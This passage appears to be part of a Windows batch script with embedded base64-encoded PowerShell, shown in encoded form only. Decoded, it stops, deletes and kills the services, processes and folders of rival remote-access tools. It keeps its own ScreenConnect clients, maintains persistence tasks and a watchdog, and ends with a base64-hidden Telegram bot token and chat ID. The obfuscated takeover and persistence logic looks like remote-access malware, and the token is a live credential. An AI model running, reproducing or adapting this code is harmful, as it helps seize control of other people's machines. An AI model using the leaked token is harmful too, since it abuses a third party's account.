cm9kdWN0S2V5ICRfKSB7ICRuLnJtbSsrOyAkaGl0ID0gJHRydWUgfQogICAgICAgICAgICAgICAg
ICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBm
b3JlYWNoICgkcGF0IGluICR0b29sLlN2YykgewogICAgICAgICAgICBHZXQtU2VydmljZSAtTmFt
ZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgewog
ICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRfLk5hbWUgLW9yIElzLURhdHRvS2Vl
cGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAicm1tX3NraXBfZGF0dG9fc3ZjICQoJF8uTmFtZSki
OyByZXR1cm4gfQogICAgICAgICAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgkXy5OYW1lKSIgMj4m
MSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUw
MAogICAgICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0
LU51bGwKICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3N2
Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAgICAg
ICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9jKSB7CiAgICAgICAgICAgIEdl
dC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklkIC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAgICAgJG4ucm1tKys7
ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJvY19raWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkgWyQo
JHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJGQg
aW4gJHRvb2wuRGlycykgewogICAgICAgICAgICBpZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAkZCkpIHsKICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZCkgeyBM
b2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgIGlm
IChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1f
ZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAi
cm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAg
ICAgaWYgKCRoaXQpIHsgTG9nICJybW1fZXh0ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIgfQogICAg
fQoKICAgICRzdW1tYXJ5ID0gImV4dGVybWluYXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRuLnBy
b2MpIGRpcj0kKCRuLmRpcikgcHJvZHVjdD0kKCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkgZmFp
bD0kKCRuLmZhaWwpIgogICAgTG9nICRzdW1tYXJ5CiAgICByZXR1cm4gJHN1bW1hcnkKfQoKZnVu
Y3Rpb24gVXBkYXRlLVN0YXRlIHsKICAgICRrZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykK
ICAgICRncnl4YUZwID0gR2V0LUdyeXhhRnAKICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVs
bDsgJHNjcmlwdDpncnl4YSA9ICRudWxsCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2Vydmlj
ZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1l
IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgewogICAgICAgICAgICBpZiAoJG1hdGNoZXNb
MV0gLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAkcHJpbSA9ICIkKCRzdmMuU3RhdHVzKSIgfQog
ICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFdIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsg
JGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFd
IC1lcSAkZ3J5eGFGcCkgeyAkc2NyaXB0OmdyeXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAg
ICAgfQogICAgfQogICAgJGZvcmVpZ24gPSBAKCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1T
ZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3Zj
Lk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGlu
ICRrZWVwKSB7CiAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdCiAgICAgICAgfQog
ICAgfQogICAgJGlkID0gUmVhZC1JZGVudGl0eQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3Rh
bCA9IDAKICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNL
X0QnKSB7CiAgICAgICAgJHRhc2tzVG90YWwrKwogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNr
TmFtZSAoW3N0cmluZ10kaWRbJGtdKQogICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9
CiAgICAgICAgJG1hcmtlciA9IGlmICgkayAtZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9
IGVsc2UgeyAnb3duX21vbi5jbWQnIH0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRu
ICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2VyKSkgeyAkdGFz
a3NPaysrIH0KICAgIH0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1Q
YXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQogICAgJHdkID0gRW5zdXJlLVdhdGNoZG9nCiAg
ICAkcHJldiA9IEB7fQogICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUu
anNvbicKICAgIGlmIChUZXN0LVBhdGggJHN0YXRlUGF0aCkgewogICAgICAgIHRyeSB7IChHZXQt
Q29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbiku
UFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAk
Xy5WYWx1ZSB9IH0gY2F0Y2gge30KICAgIH0KICAgICRpbnN0YWxsQ291bnQgPSAxCiAgICBpZiAo
JHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxD
b3VudCB9CiAgICBpZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAt
YW5kICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0KICAgICRzdGF0ZSA9
IFtvcmRlcmVkXUB7CiAgICAgICAgaG9zdCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUKICAg
ICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5n
KCdvJykKICAgICAgICBidWlsZCAgICAgICAgPSAkQnVpbGQKICAgICAgICBwcmltICAgICAgICAg
PSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBhbHQg
ICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAg
ICAgZ3J5eGEgICAgICAgID0gJChpZiAoJHNjcmlwdDpncnl4YSkgeyAkc2NyaXB0OmdyeXhhIH0g
ZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGdyeXhhRnAgICAgICA9ICRncnl4YUZwCiAgICAg
ICAgZm9yZWlnbiAgICAgID0gJGZvcmVpZ24KICAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NP
awogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1RvdGFsCiAgICAgICAgd2F0Y2hkb2cgICAg
ID0gJHdkCiAgICAgICAgaW5zdGFsbENvdW50ID0gJGluc3RhbGxDb3VudAogICAgICAgIGxhc3RI
ZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRv
U3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0g
ZWxzZSB7ICRudWxsIH0pCiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhCiAgICB9CiAgICAo
JHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQogICAgcmV0dXJuICRzdGF0ZQp9Cgpzd2l0Y2ggKCRBY3Rp
b24pIHsKICAgICdpbml0JyAgICAgICAgICAgIHsgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsg
JGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZh
bHVlKSIgfSB9CiAgICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRp
ZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1
ZSkiIH0gfQogICAgJ3dhdGNoZG9nJyAgICAgICAgeyBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51
bGwgfQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBFbnN1cmUtV2F0Y2hkb2cgfQogICAgJ3Rhc2tz
LWVuc3VyZScgICAgeyBFbnN1cmUtUGVyc2lzdFRhc2tzIH0KICAgICdzdGF0ZScgICAgICAgICAg
IHsgVXBkYXRlLVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0KICAgICdyZXBhaXIn
ICAgICAgICAgIHsgUmVwYWlyLVNDU2VydmljZSAkRnAgfQogICAgJ3JlZ2lzdGVyZWQnICAgICAg
eyBUZXN0LVNDUmVnaXN0ZXJlZCAkRnAgfQogICAgJ2V4dGVybWluYXRlJyAgICAgeyBJbnZva2Ut
RXh0ZXJtaW5hdGUgfQogICAgJ2dyeXhhLWhlYWx0aCcgICAgeyBUZXN0LUdyeXhhSGVhbHRoIH0K
ICAgICdncnl4YS1lbnN1cmUnICAgIHsgV3JpdGUtT3V0cHV0IChJbnZva2UtR3J5eGFFbnN1cmUg
fCBPdXQtU3RyaW5nKS5UcmltKCkgfQp9Cg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
